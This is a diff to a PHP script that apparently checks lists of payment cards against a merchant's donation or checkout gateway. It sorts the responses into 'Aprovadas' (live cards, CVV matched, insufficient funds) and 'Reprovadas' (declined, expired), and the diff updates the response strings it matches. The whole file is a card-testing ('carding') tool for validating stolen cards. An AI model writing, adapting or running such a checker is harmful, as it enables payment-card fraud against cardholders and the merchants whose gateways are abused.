@@ -106,7 +106,7 @@ if (strpos($result33, '"cvc_check": "pass"')) {
 elseif(strpos($result3, "Thank You For Donation." )) {
   echo '<span class="badge badge-success">Aprovadas</span> <span class="badge badge-success">✓</span> <span class="badge badge-pill badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-pill badge-success"> ★★ CVV MATCHED ♛ANONBD </span></br>';
 }
-elseif(strpos($result3, "Thank You." )) {
+elseif(strpos($result3, "checkout_success" )) {
   echo '<span class="badge badge-success">Aprovadas</span> <span class="badge badge-success">✓</span> <span class="badge badge-pill badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-pill badge-success"> ★ CVC MATCHED ★ANONBD</span></br>';
 }
 if(strpos($result3, "Your card's security code is incorrect")) {
@@ -117,7 +117,7 @@ if(strpos($result3, "Your card's security code is incorrect")) {
 elseif(strpos($result3, 'Your card zip code is incorrect.' )) {
   echo '<span class="badge badge-success">Aprovadas</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-pill badge-success"> ★ CVC MATCHED - Incorrect Zip♛ANONBD </span></br>';
 }
-elseif(strpos($result3, 'Your card has insufficient funds.')) {
+elseif(strpos($result3, 'There was a problem with your credit card information: Your card has insufficient funds.')) {
   echo '<span class="badge badge-success">Aprovadas</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-pill badge-success"> ★ Insufficient Funds♛ANONBD </span></br>';
 }
 elseif(strpos($result3, 'Your card has expired.')) {
@@ -132,7 +132,7 @@ elseif(strpos($result3, 'Your card number is incorrect.')) {
  elseif (strpos($result3, "incorrect_number")) {
   echo '<span class="badge badge-danger">Reprovadas</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-pill badge-danger"> ★ Incorrect Card Number♛ANONBD</span> </br>';
 }
-elseif(strpos($result3, 'Your card was declined.')) {
+elseif(strpos($result3, 'There was a problem with your credit card information: Your card was declined.')) {
   echo '<span class="badge badge-danger">Reprovadas</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-pill badge-danger"> ★ Card Declined  ♛ANONBD</span> </br>';
 }
 elseif (strpos($result3, "generic_decline")) {
@@ -150,7 +150,7 @@ elseif (strpos($result3, '"cvc_check": "fail"')) {
 elseif (strpos($result3, "expired_card")) {
   echo '<span class="badge badge-danger">Reprovadas</span> <span class="badge badge-pill badge-danger">✕</span> <span class="badge badge-pill badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-pill badge-secondary"> ★ Expired Card ♛ANONBD</span> </br>';
 }
-elseif (strpos($result3,'Your card does not support this type of purchase.')) {
+elseif (strpos($result3,'There was a problem with your credit card information: Your card does not support this type of purchase.')) {
   echo '<span class="badge badge-warning">Reprovadas</span> <span class="badge badge-pill badge-warning">✕</span> <span class="badge badge-warning">' . $lista . '</span> <span class="badge badge-pill badge-warning">✕</span> <span class="badge badge-pill badge-warning"> ★ Card Doesnt Support This Purchase ♛ANONBD</span> </br>';
 }
 
